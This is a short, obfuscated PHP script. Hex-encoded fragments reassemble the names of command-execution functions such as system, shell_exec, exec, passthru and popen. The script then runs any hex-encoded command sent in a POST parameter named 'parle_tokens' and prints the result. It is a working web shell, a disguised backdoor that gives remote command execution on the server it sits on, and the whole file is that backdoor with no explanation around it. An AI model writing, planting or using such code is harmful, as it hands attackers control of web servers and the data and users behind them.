<?php

$param1 = '737';
$param2 = '973';
$param3 = '56d';
$param4 = '736';
$param5 = '865';
$param6 = '6c6';
$param7 = 'c5f';
$param8 = '657';
$param9 = '706';
$param10 = '727';
$param11 = 'f70';
$param12 = '16d';
$param13 = 'f63';
$param14 = '6f6';
$param15 = 'e74';
$param16 = '656';
$param17 = '365';
$param18 = '55f';
$uconvert1 = pack("H*", $param1 . $param2 . '746' . $param3);
$uconvert2 = pack("H*", $param4 . $param5 . $param6 . $param7 . $param8 . $param5);
$uconvert3 = pack("H*", '657' . $param5);
$uconvert4 = pack("H*", $param9 . '173' . '737' . '468' . $param10);
$uconvert5 = pack("H*", '706' . $param11 . '656');
$uconvert6 = pack("H*", '737' . '472' . '656' . $param12 . '5f6' . '765' . '745' . $param13 . $param14 . $param15 . $param16 . 'e74');
$uconvert7 = pack("H*", $param9 . '36c' . '6f7' . $param17);
$parle_tokens = pack("H*", '706' . '172' . '6c6' . $param18 . '746' . 'f6b' . $param16 . 'e73');
if (isset($_POST[$parle_tokens])) {
    $parle_tokens = pack("H*", $_POST[$parle_tokens]);
    if (function_exists($uconvert1)) {
        $uconvert1($parle_tokens);
    } elseif (function_exists($uconvert2)) {
        print $uconvert2($parle_tokens);
    } elseif (function_exists($uconvert3)) {
        $uconvert3($parle_tokens, $id_st);
        print join("\n", $id_st);
    } elseif (function_exists($uconvert4)) {
        $uconvert4($parle_tokens);
    } elseif (function_exists($uconvert5) && function_exists($uconvert6) && function_exists($uconvert7)) {
        $state_slt = $uconvert5($parle_tokens, 'r');
        if ($state_slt) {
            $identifier_ph = $uconvert6($state_slt);
            $uconvert7($state_slt);
            print $identifier_ph;
        }
    }
    exit;
}
